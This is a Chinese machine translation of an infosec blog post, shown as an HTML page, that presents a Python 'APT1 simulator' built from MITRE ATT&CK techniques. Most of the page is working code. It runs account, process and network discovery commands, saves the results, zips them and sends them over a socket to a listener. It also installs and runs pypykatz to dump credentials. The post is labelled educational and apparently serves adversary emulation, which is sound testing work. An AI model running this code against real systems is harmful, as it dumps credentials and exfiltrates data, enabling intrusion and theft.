<html>
<head>
<title>Python APT1 Simulator</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Python APT1模拟器</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/python-apt1-simulator-41df8f4fe655?source=collection_archive---------2-----------------------#2022-11-14">https://infosecwriteups.com/python-apt1-simulator-41df8f4fe655?source=collection_archive---------2-----------------------#2022-11-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/fa1130989e7bc868c4e5862014d1db73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*7cC5R8Zeqear9FCO"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">马库斯·斯皮斯克在<a class="ae kc" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上的照片</figcaption></figure><p id="affa" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">米特尔ATT CK公司关于APT1集团的信息如下:</p><p id="c1fd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">APT1使用命令net localgroup、net user和net group在系统上查找帐户。<br/> APT1已经使用RAR压缩文件，然后将它们转移到受害者网络之外。<br/> APT1使用批处理脚本来执行一系列发现技术，并将其保存到文本文件中。APT1从一名当地受害者那里收集了一些文件。<br/> APT1上市互联网络股份。<br/>众所周知，APT1利用Mimikatz进行凭证倾销。<br/> APT1使用tasklist /v收集系统上正在运行的进程列表。<br/> APT1使用ipconfig /all命令收集网络配置信息。<br/> APT1使用net use命令获得网络连接列表。<br/> APT1使用命令net start和tasklist获得系统上的服务列表。</p><div class="lb lc gp gr ld le"><a href="https://github.com/anil-yelken/APT-Simulator" rel="noopener  ugc nofollow" target="_blank"><div class="lf ab fo"><div class="lg ab lh cl cj li"><h2 class="bd ir gy z fp lj fr fs lk fu fw ip bi translated">GitHub-Anil-yelken/APT-Simulator:APT模拟器</h2><div class="ll l"><h3 class="bd b gy z fp lj fr fs lk fu fw dk translated">来自米特ATT和CK的关于APT1小组的测试Windows 10信息如下:APT1使用了命令net…</h3></div><div class="lm l"><p class="bd b dl z fp lj fr fs lk fu fw dk translated">github.com</p></div></div><div class="ln l"><div class="lo l lp lq lr ln ls jw le"/></div></div></a></div></div><div class="ab cl lt lu hu lv" role="separator"><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly"/></div><div class="ij ik il im in"><p id="9245" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在让我们用python解释一下代码。</p><p id="f6f4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">APT1使用命令net localgroup、net user和net group在系统上查找帐户。</p><pre class="ma mb mc md gt me mf mg bn mh mi bi"><span id="5aa2" class="mj mk iq mf b be ml mm l mn mo">try:<br/>    localgroup=subprocess.check_output("net localgroup",shell=True)<br/>    with open("localgroup.txt", 'wb') as file:<br/>        file.write(localgroup)<br/>except:<br/>    pass<br/>try:<br/>    user=subprocess.check_output("net user",shell=True)<br/>    with open("user.txt", 'wb') as file:<br/>        file.write(user)<br/>except:<br/>    pass<br/>try:<br/>    group=subprocess.check_output("net group",shell=True)<br/>    with open("group.txt", 'wb') as file:<br/>        file.write(group)<br/>except:<br/>    pass</span></pre><p id="e719" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">APT1已经使用RAR压缩文件，然后将它们移出受害者网络。</p><p id="8c37" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">客户:</p><pre class="ma mb mc md gt me mf mg bn mh mi bi"><span id="e248" class="mj mk iq mf b be ml mm l mn mo">try:<br/>    file_zip = zipfile.ZipFile('file.zip', 'w')<br/>    for folder, subfolders, files in os.walk('.'):<br/>        for file in files:<br/>            if file.endswith('.txt'):<br/>                file_zip.write(os.path.join(folder, file),<br/>                              os.path.relpath(os.path.join(folder, file), '.'),<br/>                              compress_type=zipfile.ZIP_DEFLATED)<br/>    file_zip.close()<br/>    print("Files are compressed.")<br/>    s = socket.socket()<br/>    s.connect(("127.0.0.1", 80))<br/>    with open("file.zip", "rb") as f:<br/>        while True:<br/>            bytes_read = f.read(4096)<br/>            if not bytes_read:<br/>                break<br/>            s.sendall(bytes_read)<br/>    s.close()<br/>    print("Zip file sent.")<br/>except:<br/>    pass</span></pre><p id="aa43" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">服务器:</p><pre class="ma mb mc md gt me mf mg bn mh mi bi"><span id="3a5e" class="mj mk iq mf b be ml mm l mn mo">import socket<br/>s = socket.socket()<br/>s.bind(("0.0.0.0", 80))<br/>s.listen()<br/>client_socket, address = s.accept()<br/>print(f"[+] {address} is connected.")<br/>with open("received_file.zip", "wb") as f:<br/>    while True:<br/>        bytes_read = client_socket.recv(4096)<br/>        if not bytes_read:<br/>            break<br/>        f.write(bytes_read)<br/>client_socket.close()<br/>s.close()</span></pre><p id="59a4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">APT1上市的互联网络股份。</p><pre class="ma mb mc md gt me mf mg bn mh mi bi"><span id="33e0" class="mj mk iq mf b be ml mm l mn mo">try:<br/>    netuse=subprocess.check_output("net use",shell=True)<br/>    with open("netuse.txt", 'wb') as file:<br/>        file.write(netuse)<br/>except:<br/>    pass</span></pre><p id="b183" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">众所周知，APT1使用Mimikatz进行凭据转储。</p><pre class="ma mb mc md gt me mf mg bn mh mi bi"><span id="0bac" class="mj mk iq mf b be ml mm l mn mo">try:<br/>    os.system("pip3 install pypykatz")<br/>except:<br/>    pass<br/>try:<br/>    os.system("pypykatz.py rekall dump -t 0")<br/>    print("pypykatz is finished.")<br/>except:<br/>    pass</span></pre><p id="3e36" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">APT1使用tasklist /v收集了系统上正在运行的进程的列表</p><pre class="ma mb mc md gt me mf mg bn mh mi bi"><span id="9d1b" class="mj mk iq mf b be ml mm l mn mo">try:<br/>    tasklist=subprocess.check_output("tasklist /v",shell=True)<br/>    with open("tasklist.txt", 'wb') as file:<br/>        file.write(tasklist)<br/>except:<br/>    pass</span></pre><p id="822c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">APT1使用ipconfig /all命令收集网络配置信息。</p><pre class="ma mb mc md gt me mf mg bn mh mi bi"><span id="4172" class="mj mk iq mf b be ml mm l mn mo">try:<br/>    ipconfig=subprocess.check_output("ipconfig /all",shell=True)<br/>    with open("ipconfig.txt", 'wb') as file:<br/>        file.write(ipconfig)<br/>except:<br/>    pass</span></pre><p id="d8fd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">APT1使用命令net start和tasklist来获取系统上的服务列表。</p><pre class="ma mb mc md gt me mf mg bn mh mi bi"><span id="4305" class="mj mk iq mf b be ml mm l mn mo">try:<br/>    netstart=subprocess.check_output("net start",shell=True)<br/>    with open("netstart.txt", 'wb') as file:<br/>        file.write(netstart)<br/>except:<br/>    pass<br/>try:<br/>    tasklist=subprocess.check_output("tasklist /v",shell=True)<br/>    with open("tasklist.txt", 'wb') as file:<br/>        file.write(tasklist)<br/>except:<br/>    pass</span></pre><p id="df77" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">注:为教育目的而写。</p></div><div class="ab cl lt lu hu lv" role="separator"><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly"/></div><div class="ij ik il im in"><h2 id="77db" class="mp mk iq bd mq mr ms dn mt mu mv dp mw ko mx my mz ks na nb nc kw nd ne nf ng bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kc" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>